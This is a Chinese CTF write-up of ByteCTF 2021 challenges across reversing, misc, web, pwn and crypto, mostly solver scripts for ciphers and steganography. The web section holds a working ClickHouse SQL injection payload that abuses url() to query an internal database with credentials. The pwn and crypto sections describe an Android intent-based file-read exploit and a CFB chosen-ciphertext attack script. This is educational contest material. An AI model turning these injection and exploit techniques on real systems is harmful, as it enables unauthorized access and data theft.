# ByteCTF

阅读量 **201728**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-10-26 15:30:07

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t0110d8c02b3151afdf.jpg)

## Reverse

###  moderncpp

經過奇怪的一種轉化後將輸入轉化爲01串，應該是一種樹形結構。  
類似於哈夫曼樹的感覺，沒有細看。  
然後就是一個簡單的tea。  
dump出各個字符對應的bit位，算出tea結果，拿去匹配算出flag。

    
    
    cmps="00001100111100000110100111011000010010100011001011111011011000101000111010100100110011000000110011000000001000100110001111100101101101101111110100000111010111101110011011111110110001101000110111111101100011010101000110101101111001000110100011111010000101000111100000000000000000000000000000000000000000000000000000000000"
    map01={}
    map01["a"]="100101"
    map01["b"]="00001"
    map01["c"]="01110"
    map01["d"]="11011"
    map01["e"]="0011010"
    map01["f"]="010010"
    map01["g"]="111011"
    map01["h"]="01000"
    map01["i"]="10110"
    map01["j"]="00110111"
    map01["k"]="1111010"
    map01["l"]="110010"
    map01["m"]="00011"
    map01["n"]="10000"
    map01["o"]="10100011101"
    map01["p"]="0110011"
    map01["q"]="011000"
    map01["r"]="111110"
    map01["s"]="01011"
    map01["t"]="11000"
    map01["u"]="11110110"
    map01["v"]="000001"
    map01["w"]="111000"
    map01["x"]="00101"
    map01["y"]="10011"
    map01["z"]="101000110"
    map01["0"]="1110010"
    map01["1"]="100100"
    map01["2"]="111111"
    map01["3"]="01101"
    map01["4"]="11010"
    map01["5"]="11110111"
    map01["6"]="001100"
    map01["7"]="111010"
    map01["8"]="00111"
    map01["9"]="10101"
    map01["!"]="00110110"
    map01["@"]="1110011"
    map01["#"]="101001"
    map01["%"]="00010"
    map01["^"]="01111"
    map01["&"]="10100011100"
    map01["*"]="0110010"
    map01["("]="010011"
    map01[")"]="111100"
    map01["_"]="01010"
    map01["+"]="10111"
    map01["-"]="10100010"
    map01["="]="000000"
    map01["["]="110011"
    map01["]"]="00100"
    map01["{"]="10001"
    map01["}"]="1010001111"
    map01[";"]="1010000"
    path=[]
    def output():
        strs=""
        for i in path:
            strs+=i
        print(strs)
    def dfs(ptr):
        if ptr>len(cmps):
            return
        output()
        for k,v in map01.items():
            if cmps[ptr:ptr+len(v)]==v:
                path.append(k)
                dfs(ptr+len(v))
                path.remove(k)
    dfs(0)
    

## Misc

###  BabyShark

给出了一个流量包，流量包我们可以看到里面第一个TCP流中有利用adbshell进行下载得一个程序。我们将其提取下来反编译。

    
    
    package com.bytectf.misc1;
    
    import javax.crypto.Cipher;
    import javax.crypto.spec.IvParameterSpec;
    import javax.crypto.spec.SecretKeySpec;
    
    public class AesUtil {
        private static final String CipherMode = "AES/CFB/NoPadding";
    
        private static String byte2hex(byte[] b) {
            StringBuilder sb = new StringBuilder(b.length * 2);
            int v3;
            for(v3 = 0; v3 < b.length; ++v3) {
                String v1 = Integer.toHexString(b[v3] & 0xFF);
                if(v1.length() == 1) {
                    sb.append("0");
                }
    
                sb.append(v1);
            }
    
            return sb.toString().toUpperCase();
        }
    
        private static SecretKeySpec createKey(long key) {
            return new SecretKeySpec(AesUtil.paddingBytes(AesUtil.longToBytes(key)), "AES");
        }
    
        public static String decrypt(long key, String cipherText) {
            SecretKeySpec keySpec = AesUtil.createKey(key);
            byte[] cipherBytes = AesUtil.hex2byte(cipherText);
            try {
                Cipher v2 = Cipher.getInstance("AES/CFB/NoPadding");
                v2.init(2, keySpec, new IvParameterSpec(new byte[v2.getBlockSize()]));
                return new String(v2.doFinal(cipherBytes), "UTF-8");
            }
            catch(Exception e) {
                e.printStackTrace();
                return "";
            }
        }
    
        public static String encrypt(long key, String flag) {
            SecretKeySpec keySpec = AesUtil.createKey(key);
            try {
                byte[] data = flag.getBytes("UTF-8");
                Cipher cipher = Cipher.getInstance("AES/CFB/NoPadding");
                cipher.init(1, keySpec, new IvParameterSpec(new byte[cipher.getBlockSize()]));
                return AesUtil.byte2hex(cipher.doFinal(data));
            }
            catch(Exception e) {
                e.printStackTrace();
                return null;
            }
        }
    
        private static byte[] hex2byte(String inputString) {
            if(inputString != null && inputString.length() >= 2) {
                String v6 = inputString.toLowerCase();
                int l = v6.length() / 2;
                byte[] result = new byte[l];
                int i;
                for(i = 0; i < l; ++i) {
                    result[i] = (byte)(Integer.parseInt(v6.substring(i * 2, i * 2 + 2), 16) & 0xFF);
                }
    
                return result;
            }
    
            return new byte[0];
        }
    
        public static byte[] longToBytes(long value) {
            return new byte[]{((byte)(((int)(value & 0xFFL)))), ((byte)(((int)(value >> 8 & 0xFFL)))), ((byte)(((int)(value >> 16 & 0xFFL)))), ((byte)(((int)(value >> 24 & 0xFFL)))), ((byte)(((int)(value >> 0x20 & 0xFFL)))), ((byte)(((int)(value >> 40 & 0xFFL)))), ((byte)(((int)(value >> 0x30 & 0xFFL)))), ((byte)(((int)(value >> 56 & 0xFFL))))};
        }
    
        private static byte[] paddingBytes(byte[] data) {
            byte[] padding = new byte[0x20];
            int i;
            for(i = 0; i < 0x20; ++i) {
                padding[i] = i < data.length ? data[i] : 0;
            }
    
            return padding;
        }
    }
    

以及一些程序不放了。简单说就是利用第一次请求的数据来加密了下当作key
解密apk中的数据就能得到flag了。我们可以发现是protobuf，利用在线网站求解出key直接解密得到flag.  
直接抄apk里的src解密

    
    
    import javax.crypto.Cipher;
    import javax.crypto.spec.IvParameterSpec;
    import javax.crypto.spec.SecretKeySpec;
    
    public class boom {
        private static final String CipherMode = "AES/CFB/NoPadding";
        public static void main(String[] args){
            long i = 0;
            String res;
            res = decrypt( (long)244837809871755L,"8939AA47D35006FB2B5FBDB9A810B25294B5D4D76E4204D33BA01F7B3F9D99B1");
            System.out.println(res);
    
        }
        private static String byte2hex(byte[] b) {
            StringBuilder sb = new StringBuilder(b.length * 2);
            int v3;
            for(v3 = 0; v3 < b.length; ++v3) {
                String v1 = Integer.toHexString(b[v3] & 0xFF);
                if(v1.length() == 1) {
                    sb.append("0");
                }
    
                sb.append(v1);
            }
    
            return sb.toString().toUpperCase();
        }
    
        private static SecretKeySpec createKey(long key) {
            return new SecretKeySpec(paddingBytes(longToBytes(key)), "AES");
        }
    
        public static String decrypt(long key, String cipherText) {
            SecretKeySpec keySpec = createKey(key);
            byte[] cipherBytes = hex2byte(cipherText);
            try {
                Cipher v2 = Cipher.getInstance("AES/CFB/NoPadding");
                v2.init(2, keySpec, new IvParameterSpec(new byte[v2.getBlockSize()]));
                return new String(v2.doFinal(cipherBytes), "UTF-8");
            }
            catch(Exception e) {
                e.printStackTrace();
                return "";
            }
        }
    
    
        private static byte[] hex2byte(String inputString) {
            if(inputString != null && inputString.length() >= 2) {
                String v6 = inputString.toLowerCase();
                int l = v6.length() / 2;
                byte[] result = new byte[l];
                int i;
                for(i = 0; i < l; ++i) {
                    result[i] = (byte)(Integer.parseInt(v6.substring(i * 2, i * 2 + 2), 16) & 0xFF);
                }
    
                return result;
            }
    
            return new byte[0];
        }
    
        public static byte[] longToBytes(long value) {
            return new byte[]{((byte)(((int)(value & 0xFFL)))), ((byte)(((int)(value >> 8 & 0xFFL)))), ((byte)(((int)(value >> 16 & 0xFFL)))), ((byte)(((int)(value >> 24 & 0xFFL)))), ((byte)(((int)(value >> 0x20 & 0xFFL)))), ((byte)(((int)(value >> 40 & 0xFFL)))), ((byte)(((int)(value >> 0x30 & 0xFFL)))), ((byte)(((int)(value >> 56 & 0xFFL))))};
        }
    
    
        private static byte[] paddingBytes(byte[] data) {
            byte[] padding = new byte[0x20];
            int i;
            for(i = 0; i < 0x20; ++i) {
                padding[i] = i < data.length ? data[i] : 0;
            }
            return padding;
        }
    
    
    }
    

###  Lost Excel

分离excel文件，拿到点阵图，发现LSB隐写。根据提示blocksize=8将其分为8*8pixel的格子  
发现有许多循环出现的部分，直接读。

根据格子中黑点出现的位置将其转换为二进制

![](https://p4.ssl.qhimg.com/t01b71b1ef94967919c.png)

    
    
    from PIL import Image
    ans=''
    def check(temp):
        global ans
        for y in range(2):
            for x in range(2):
                if temp.getpixel((x*4,y*4))==(0,0,0):
                    ans=ans+str(y)+str(x)
    for i in range(4,5700):
        img=Image.open('{}.png'.format(i))
        check(img)
    print(ans)
    

得到01串，读一下 得到flag

![](https://p1.ssl.qhimg.com/t01015ebc5b8e5a0888.png)

###  frequently

题目比较简单  
dns tunnel中 i,o两种代表 01 获得前一半部分flag。  
后一半在DHCP协议中，一次传输一字节。  
拼接得到flag.

###  HearingNotBelieving

比较简单。  
audacity可以发现前面是个二维码。  
后面是16段 robot96 的无线电。  
还是拼成二维码。都不好扫。。直接利用Qrazybox手点。  
拼接得到flag

###  签到

nice game

###  问卷

nice game

## Web

###  double sqli

clickhouse注入，路径穿越找到user_01和密码

    
    
    import requests,re
    
    url = "http://39.105.175.150:30001/"
    param = {
        "id":f"1 and updatexml(1,concat(0x7e,(SELECT * FROM url('http://127.0.0.1:8123?user=
        user_01&password=e3b0c44298fc1c149afb&query=select+flag+from+ctf.flag',
        RawBLOB, 'column1 String') LIMIT 0,1),0x7e),1)"
    }
    
    res = requests.get(url,params=param)
    print(res.text)
    

## Pwn

###  babydroid

![](https://p3.ssl.qhimg.com/t01a08dd7ef9307e2f5.png)

Vulnerable类默认导出，

![](https://p3.ssl.qhimg.com/t011c589ab61c12ab03.png)

intent作为漏洞利用点传入poc

![](https://p2.ssl.qhimg.com/t01cd6d6443702dc737.png)

![](https://p1.ssl.qhimg.com/t010eb9877466286e49.png)

存在content provider，非导出，构造poc使pwnbabydroid可读取任意文件

![](https://p3.ssl.qhimg.com/t010e25220044a249e7.png)

这样就可以先跳转到Vulnerable然后传入poc打开读写权限  
之后在babydroid跳转到Attack类并且讲读入的flag打回即可

![](https://p2.ssl.qhimg.com/t015b2e08b5206425e1.png)

## Crypto

###  abusedkey

协议二，传Qc=hc _G, Qs=G，则Ys_ ds = Yc，爆破hs得到协议一私钥，之后协议一传Tc = -Pc，则Kcs = -hc _ds_
G，解密即可。

###  JustDecrypt

CFB模式的选择明密文攻击，每次其实只加密一个字节，这一点在Crypto.Cipher.AES.new()的源码注释中可以看到。可以交互52次，刚好是：49次构造原文，1次构造padding，一次还原寄存器状态，正好够了。

    
    
    # -*- coding: utf-8 -*-    
    import re
    from pwn import *
    import string
    from Crypto.Util.number import *
    from hashlib import sha256
    from os import urandom
    
    ip, port = "39.105.181.182", 30001
    #context.log_level = "debug"
    
    
    
    charset = string.ascii_letters + string.digits
    def proof(known, hashcode):
        for each1 in charset:
            for each2 in charset:
                for each3 in charset:
                    for each4 in charset:
                        this = each1 + each2 + each3 + each4 + known
                        if sha256(this.encode()).hexdigest() == hashcode:
                            return each1 + each2 + each3 + each4
    
    def send(data):
        if len(data) % 2 == 1:
            data = '0' + data
        sh.recvuntil("hex > ")
        sh.sendline(data)
        if sh.recv(1) == b'N':
            raise ValueError
        sh.recvuntil("plaintext in hex: \n")
        data = sh.recvline(keepends = False)
        if len(data) == 0:
            return b'\x00'
        return long_to_bytes(int(data, 16))
    
    def tohex(s):
        return hex(bytes_to_long(s))[2:]
    
    sh = remote(ip, port)
    sh.recvuntil("sha256")
    data = sh.recvline().decode()
    ciphers = b''
    
    
    known, hashcode = re.findall(r'\(XXXX\+(.*?)\) == (.*?)\n', data)[0]
    sh.recvuntil("> ")
    
    log.info("known: %s", known)
    log.info("hashcode: %s", hashcode)
    
    ans = proof(known, hashcode)
    sh.sendline(ans)
    
    base = urandom(16)
    pad = urandom(256)
    
    target = b"Hello, I'm a Bytedancer. Please give me the flag!"
    
    for i in range(49):
    
        this = base + ciphers + long_to_bytes(target[i])
        num = 16 - (len(this) % 16)
        this += num * b'\x00'
        res = send(tohex(this + pad))
        # log.info(str(res))
        ciphers += long_to_bytes(res[16 + i])
    
    r = urandom(14)
    res = send(tohex(base + ciphers + r + b'\x0f' + pad))
    # log.info(str(res))
    ciphers = ciphers + r + long_to_bytes(res[79])
    
    send(tohex(base))
    res = send(tohex(ciphers))
    print(res)
    sh.interactive()
    

###  Overheard

小根，直接模p上构造个方程，二元Coppersmith：

    
    
    p = 62606792596600834911820789765744078048692259104005438531455193685836606544743
    
    T0 = 55658005286954458353074331148659743689991644180445271176712023946898001887232
    T1 = 10828133361441717892727545369261900198567704830372084498049248764284301737984
    
    
    PR.< x, y > = PolynomialRing(ZZ)
    pol = T0**2 + x**2 + 2*T0*x - T1 - y
    
    X = 2**64
    m = 3
    
    gg = []
    monomials = []
    # x-shifts
    for i in range(m+1):
        for j in range(m - i + 1):
            gg.append(x**j * p**(m-i) * pol**i)
    
    # y-shifts
    for i in range(m+1):
        for j in range(m - i + 1):
            gg.append(y**j * p**(m-i) * pol**i)
    
    
    # list monomials
    for polynomial in gg:
        for monomial in polynomial.monomials():
            if monomial not in monomials:
                monomials.append(monomial)
    gg = list(set(gg))
    monomials = list(set(monomials))
    
    rows = len(gg)
    cols = len(monomials)
    B = Matrix(ZZ, rows, cols)
    for i in range(rows):
        for j in range(cols):
            if monomials[j] in gg[i].monomials():
                B[i, j] = gg[i].monomial_coefficient(monomials[j]) * monomials[j](X, X)
    
    BL = B.LLL()
    
    new_pol = []
    for i in range(rows):
        if len(new_pol) == 2:
            break
        tmp_pol = 0
        for j in range(cols):
            tmp_pol += monomials[j](x, y) * BL[i, j] / monomials[j](X, X)
        if not tmp_pol.is_zero() :
            new_pol.append(tmp_pol)
    
    PRR.<w> = PolynomialRing(ZZ)
    res = (new_pol[0].resultant(new_pol[1])(w, w)).roots()
    for i in res:
        if int(i[0]) == i[0]:
            x0 = new_pol[0](w, i[0]).roots()[0][0]
            print(T0 + x0)
    

交互部分：

    
    
    from winpwn import *
    
    
    p = 62606792596600834911820789765744078048692259104005438531455193685836606544743
    io = remote('39.105.38.192', 30000)
    
    io.recvuntil('$ ')
    io.send('1\n')
    A = int(io.recvuntil('\n').strip())
    io.recvuntil('$ ')
    io.send('2\n')
    B = int(io.recvuntil('\n').strip())
    
    io.recvuntil('$ ')
    io.send('3\n')
    io.recvuntil('Bob:')
    io.send(str(A)+'\n')
    T0 = int(io.recvuntil('\n').strip())
    
    io.recvuntil('$ ')
    io.send('3\n')
    io.recvuntil('Bob:')
    io.send(str(pow(A, 2, p))+'\n')
    T1 = int(io.recvuntil('\n').strip())
    
    print('T0 =', T0)
    print('T1 =', T1)
    
    io.recvuntil('$ ')
    io.send('4\n')
    io.recvuntil('secret:')
    
    io.interactive()
    

###  easyxor

题目中自定义了加密算法，并分别使用CBC和OFB模式进行加密。

题目中的shift函数是可逆的，其原理与梅森旋转随机数生成中的convert函数是一个意思，所以改改原来代码就能实现shift函数以及convert函数的逆向函数。

接下来分析OFB模式，

![](https://p1.ssl.qhimg.com/t01c2bd941ee3e6e400.png)

![](https://p4.ssl.qhimg.com/t0161cac4e7d4ec6d72.png)

首先有一点，我们知道flag的前8个字节为”ByteCTF{“，那么就相当于知道了明文分组1，而我们又知道密文分组1，那么经过异或，就可以得到初始化向量IV的加密值。其次，密钥长度只有24bit，所以可以通过爆破key，然后尝试解密密文分组2，查看字符。

因为不知道flag的字符集，所以只能大范围搜索，通过c++写的脚本搜出来发现很多组符合条件的key，那就拿这些key再解第三个密文分组，这样能决定出唯一一个正确的key。有了key就能解出iv，那所有的东西就出来了。

c++爆破脚本：

    
    
    #include <stdio.h>
    #include <string>
    #define ULL unsigned long long int
    
    using namespace std;
    
    ULL shift(ULL m, int k, ULL c) {
        if (k < 0) {
            return m ^ (m >> (-k)) & c;
        }
        return m ^ (m << k) & c;
    }
    
    ULL convert(ULL m, int key[]) {
        ULL c_list[4] = {0x37386180af9ae39e, 0xaf754e29895ee11a, 0x85e1a429a2b7030c, 0x964c5a89f6d3ae8c};
        for (int t = 0; t < 4; t ++) {
            m = shift(m, key[t], c_list[t]);
        }
        return m;
    }
    string Check = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$&*-@_";
    
    int main() {
    
    
        ULL start = 14682254609762378035;
        ULL c1 = 17307588413236231692;
        ULL res, m1, tmp;
    
    
        for(int a = -32; a <= 32; a ++) {
            if (a == 0) continue;
            for(int b = -32; b <= 32; b ++) {
                if (b == 0) continue;
                for(int c = -32; c <= 32; c ++) {
                    if (c == 0) continue;
                    for(int d = -32; d <= 32; d ++) {
                        if (d == 0) continue;
                        int keys[4] = {a, b, c, d};
                        res = convert(start, keys);
                        m1 = res ^ c1;
                        tmp = m1;
                        bool check = true;
                        while (m1) {
                            if (!(Check.find(char(m1 & 0xFF)) != string::npos)) {
                                check = false;
                                break;
                            }
                            m1 >>= 8;
                        }
                        if (check) {
                            printf("[%d,%d,%d,%d]\n", a, b, c, d);
                            /*
                            while (tmp) {
                                putchar(tmp & 0xFF);
                                tmp >>= 8;
                            }
                            putchar('\n');
                            putchar('\n');*/
                        }
                    }
                }
            }
        }
        return 0;
    }
    

获取到可能的key:

    
    
    [-32,10,11,7]
    [-32,20,11,-31]
    [-32,20,20,-31]
    [-32,25,1,-21]
    [-31,-5,27,-18]
    [-31,25,24,-27]
    [-30,11,27,-13]
    [-28,-10,22,9]
    [-27,11,22,-17]
    [-27,26,-3,-11]
    [-27,30,29,-6]
    [-26,11,-7,-25]
    [-25,12,7,-27]
    [-23,-4,24,-11]
    [-23,32,-4,19]
    [-22,-28,11,-2]
    [-22,-3,18,-29]
    [-22,3,17,-29]
    [-22,3,18,-30]
    [-22,26,11,-29]
    [-21,20,11,-1]
    [-19,12,-2,-31]
    [-19,12,17,-7]
    [-18,-32,11,10]
    [-18,-24,11,24]
    [-18,-7,12,24]
    [-18,11,31,10]
    [-17,-32,1,1]
    [-17,-32,11,10]
    [-17,-23,21,10]
    [-17,-4,21,-9]
    [-17,15,31,-8]
    [-16,3,18,-7]
    [-15,-4,24,-11]
    [-12,26,-3,-31]
    [-12,31,11,-6]
    [-11,25,7,8]
    [-11,31,29,8]
    [-11,32,-2,-15]
    [-10,-4,10,-31]
    [-10,-4,17,-31]
    [-10,-4,27,-31]
    [-8,-6,28,-8]
    [-8,31,8,-11]
    [-6,-3,4,2]
    [-6,12,1,-7]
    [-5,8,29,-24]
    [-5,30,29,-15]
    [-4,-25,17,11]
    [-4,-11,-1,10]
    [-3,25,23,-30]
    [-2,-3,27,14]
    [-2,22,23,8]
    [-2,23,16,17]
    [-1,2,10,-26]
    [-1,18,17,-26]
    [-1,18,17,-12]
    [1,11,8,6]
    [3,-4,21,-31]
    [5,18,31,-6]
    [7,21,11,-14]
    [8,16,23,-16]
    [9,-31,31,-11]
    [11,-13,17,-23]
    [11,-5,27,11]
    [11,25,-2,19]
    [12,26,17,-29]
    [14,18,-5,8]
    [15,27,-3,-30]
    [16,12,7,-23]
    [17,2,30,32]
    [19,19,15,-18]
    [20,16,11,-23]
    [21,26,-5,10]
    [22,-4,11,-15]
    [22,21,-2,-4]
    [24,-23,17,21]
    [24,-23,17,30]
    [24,8,32,-28]
    [24,11,-2,9]
    [24,20,29,-29]
    [25,-31,31,-23]
    [25,-4,31,11]
    [25,15,1,-12]
    [27,-2,16,17]
    [27,28,12,-30]
    [29,5,-2,10]
    [30,-20,32,-6]
    [30,26,22,-29]
    [31,-4,31,13]
    [31,4,18,-11]
    [31,8,12,-23]
    [31,12,1,-18]
    [31,12,8,-13]
    [31,20,32,-2]
    

再通过python检查一遍这些key：

    
    
    s = '''[-32,10,11,7]
    [-32,20,11,-31]
    [-32,20,20,-31]
    [-32,25,1,-21]
    [-31,-5,27,-18]
    [-31,25,24,-27]
    [-30,11,27,-13]
    [-28,-10,22,9]
    [-27,11,22,-17]
    [-27,26,-3,-11]
    [-27,30,29,-6]
    [-26,11,-7,-25]
    [-25,12,7,-27]
    [-23,-4,24,-11]
    [-23,32,-4,19]
    [-22,-28,11,-2]
    [-22,-3,18,-29]
    [-22,3,17,-29]
    [-22,3,18,-30]
    [-22,26,11,-29]
    [-21,20,11,-1]
    [-19,12,-2,-31]
    [-19,12,17,-7]
    [-18,-32,11,10]
    [-18,-24,11,24]
    [-18,-7,12,24]
    [-18,11,31,10]
    [-17,-32,1,1]
    [-17,-32,11,10]
    [-17,-23,21,10]
    [-17,-4,21,-9]
    [-17,15,31,-8]
    [-16,3,18,-7]
    [-15,-4,24,-11]
    [-12,26,-3,-31]
    [-12,31,11,-6]
    [-11,25,7,8]
    [-11,31,29,8]
    [-11,32,-2,-15]
    [-10,-4,10,-31]
    [-10,-4,17,-31]
    [-10,-4,27,-31]
    [-8,-6,28,-8]
    [-8,31,8,-11]
    [-6,-3,4,2]
    [-6,12,1,-7]
    [-5,8,29,-24]
    [-5,30,29,-15]
    [-4,-25,17,11]
    [-4,-11,-1,10]
    [-3,25,23,-30]
    [-2,-3,27,14]
    [-2,22,23,8]
    [-2,23,16,17]
    [-1,2,10,-26]
    [-1,18,17,-26]
    [-1,18,17,-12]
    [1,11,8,6]
    [3,-4,21,-31]
    [5,18,31,-6]
    [7,21,11,-14]
    [8,16,23,-16]
    [9,-31,31,-11]
    [11,-13,17,-23]
    [11,-5,27,11]
    [11,25,-2,19]
    [12,26,17,-29]
    [14,18,-5,8]
    [15,27,-3,-30]
    [16,12,7,-23]
    [17,2,30,32]
    [19,19,15,-18]
    [20,16,11,-23]
    [21,26,-5,10]
    [22,-4,11,-15]
    [22,21,-2,-4]
    [24,-23,17,21]
    [24,-23,17,30]
    [24,8,32,-28]
    [24,11,-2,9]
    [24,20,29,-29]
    [25,-31,31,-23]
    [25,-4,31,11]
    [25,15,1,-12]
    [27,-2,16,17]
    [27,28,12,-30]
    [29,5,-2,10]
    [30,-20,32,-6]
    [30,26,22,-29]
    [31,-4,31,13]
    [31,4,18,-11]
    [31,8,12,-23]
    [31,12,1,-18]
    [31,12,8,-13]
    [31,20,32,-2]'''
    s = s.split('\n')
    import json
    start = 14682254609762378035
    
    for each in s:
        key = json.loads(each)
        print(long_to_bytes(convert(convert(start, key), key) ^ cipher1[-1]))
        print(key)
    

看到当key=[-12, 26, -3, -31]时输出是正常的，其他的都不对，因此就得到了key，iv也能解了，flag就出了。

    
    
    # -*- coding: utf-8 -*-    
    def inverse_right_mask(res, shift, mask, bits=64):
        tmp = res
        for i in range(bits // shift):
            tmp = res ^ tmp >> shift & mask
        return tmp
    
    
    def inverse_left_mask(res, shift, mask, bits=64):
        tmp = res
        for i in range(bits // shift):
            tmp = res ^ tmp << shift & mask
        return tmp
    
    cipher1 = 3376918514403339497933859505838430514582460830251429894413
    cipher2 = 1457899694330042638941792634055154033944787544812083984658
    
    from Crypto.Util.number import *
    cipher1 = long_to_bytes(cipher1)
    cipher2 = long_to_bytes(cipher2)
    
    group = 3
    
    cipher1 = [bytes_to_long(cipher1[i:i+8]) for i in range(0, 24, 8)]
    cipher2 = [bytes_to_long(cipher2[i:i+8]) for i in range(0, 24, 8)]
    
    
    def shift(m, k, c):
        if k < 0:
            return m ^ m >> (-k) & c
        return m ^ m << k & c
    
    def _shift(cipher, k, c):
        if k < 0:
            return inverse_right_mask(cipher, -k, c, 64)
        return inverse_left_mask(cipher, k, c, 64)
    
    def convert(m, key):
        c_list = [0x37386180af9ae39e, 0xaf754e29895ee11a, 0x85e1a429a2b7030c, 0x964c5a89f6d3ae8c]
        for t in range(4):
            m = shift(m, key[t], c_list[t])
        return m
    
    def _convert(c, key):
        c_list = [0x37386180af9ae39e, 0xaf754e29895ee11a, 0x85e1a429a2b7030c, 0x964c5a89f6d3ae8c]
        for t in range(3, -1, -1):
            c = _shift(c, key[t], c_list[t])
    
        return c
    
    key = [-12, 26, -3, -31]
    iv = 16476971533267772345
    
    flag = b''
    
    last = iv
    for each in cipher1:
        cur_c = convert(last, key)
        flag += long_to_bytes(cur_c ^ each)
        last = cur_c
    
    last = iv
    for each in cipher2:
        cur_c = _convert(each, key)
        flag += long_to_bytes(cur_c ^ last)
        last = each
    
    print(flag)
    

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Retr_0** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/256123](/post/id/256123)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __3赞

 __收藏

![](https://p0.ssl.qhimg.com/t010457258f753577cd.png) Retr_0

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

